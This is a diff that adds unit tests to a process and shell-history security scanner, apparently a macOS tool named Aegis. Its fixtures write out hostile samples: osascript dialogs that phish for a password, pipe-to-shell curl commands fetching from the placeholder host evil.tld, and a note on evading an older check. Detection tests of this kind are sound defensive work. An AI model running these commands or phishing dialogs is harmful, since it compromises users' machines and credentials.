@@ -818,9 +818,25 @@ class TestCheckBehavior(Sandbox):
         self.assertEqual(self._run_with_ps(rows), [])
 
     def test_aegis_itself_not_flagged(self):
+        # Self-exclusion is by the real PID (unspoofable), so our OWN scanning
+        # process is skipped even when its argv carries hostile-looking patterns.
         uid = str(os.getuid())
-        rows = ["  777 %s /usr/bin/python3 python3 aegis.py scan" % uid]
+        mypid = str(os.getpid())
+        rows = ["%6s %s /usr/bin/osascript osascript -e display dialog \"pw\" "
+                "default answer \"\" with hidden answer" % (mypid, uid)]
         self.assertEqual(self._run_with_ps(rows), [])
+
+    def test_aegis_substring_in_argv_does_not_evade(self):
+        # An attacker who reads this open-source check cannot dodge detection by
+        # putting the literal word "aegis" in their command line (the old substring
+        # self-exclusion let a phish dialog reading "System aegis needs…" through).
+        uid = str(os.getuid())
+        rows = ["  888 %s /usr/bin/osascript osascript -e display dialog "
+                "\"System aegis needs your password\" default answer \"\" "
+                "with hidden answer" % uid]
+        fs = self._run_with_ps(rows)
+        self.assertTrue(any(f["category"] == "behavior" for f in fs), fs)
+        self.assertEqual(fs[0]["severity"], "CRITICAL")
 
 
 # --------------------------------------------------------------------------- #
@@ -848,6 +864,16 @@ class TestShellHistory(Sandbox):
     def test_clean_history_no_findings(self):
         self.assertEqual(self._hist("cd ~/src", "git status", "make test"), [])
 
+    def test_lone_benign_fetch_is_not_notify_grade(self):
+        # A lone `curl https://…` (no pipe-to-shell) is everyday dev work — it must
+        # score MEDIUM (logged, below the HIGH notify floor), NOT fire a HIGH
+        # desktop alert. Same gating the live-process behavioral tier uses.
+        fs = self._hist("curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh")
+        self.assertTrue(fs)
+        self.assertEqual(fs[0]["severity"], "MEDIUM")
+        self.assertLess(aegis.SEV_ORDER[fs[0]["severity"]],
+                        aegis.SEV_ORDER[aegis.NOTIFY_MIN_SEV])
+
     def test_first_run_adopts_history_silently_then_new_alerts(self):
         # Shell-history residue (a months-old `curl|sh` install line) is adopted
         # silently on the FIRST scan — logged, not notified — so upgrading Aegis on
@@ -869,6 +895,32 @@ class TestShellHistory(Sandbox):
         fb = aegis.finding("CRITICAL", "behavior", "Suspicious process behavior",
                            "osascript phish", "behavior:osascript:cccc3333")
         self.assertEqual(len(aegis.emit([fb], first_run=True)), 1)
+
+    def test_upgrade_adopts_history_silently_then_new_line_alerts(self):
+        # README guarantee: upgrading Aegis on an existing install is storm-free
+        # per-surface. shell-history is a LIVE surface, so an install predating it
+        # (a baseline with no `shell_history_adopted` marker) must adopt existing
+        # residue SILENTLY on the first scan that supports it — NOT alert a
+        # months-old `curl|sh` line — then alert genuinely-new hostile lines.
+        hist = os.path.join(self.tmp, ".zsh_history")
+        with open(hist, "w") as f:
+            f.write("curl -fsSL https://evil.tld/old | bash\n")  # pre-existing residue
+        aegis.SHELL_HISTORY_FILES = [hist]
+        # A pre-existing (pre-feature) baseline: valid, but with no adoption marker.
+        aegis.save_json(aegis.BASELINE, {"created": "2020-01-01T00:00:00+00:00",
+                                         "persistence": {}})
+        aegis.cmd_scan(quiet=True)
+        self.assertEqual(self.notifications, [],
+                         "upgrade must adopt existing history residue silently")
+        base = aegis.load_json(aegis.BASELINE, {})
+        self.assertTrue(base.get("shell_history_adopted"),
+                        "adoption marker must be recorded so it happens once")
+        # A NEW hostile line after adoption must alert.
+        with open(hist, "a") as f:
+            f.write("curl -fsSL https://evil.tld/new | bash\n")
+        aegis.cmd_scan(quiet=True)
+        self.assertTrue(self.notifications,
+                        "a new hostile history line must alert after adoption")
 
 
 # --------------------------------------------------------------------------- #
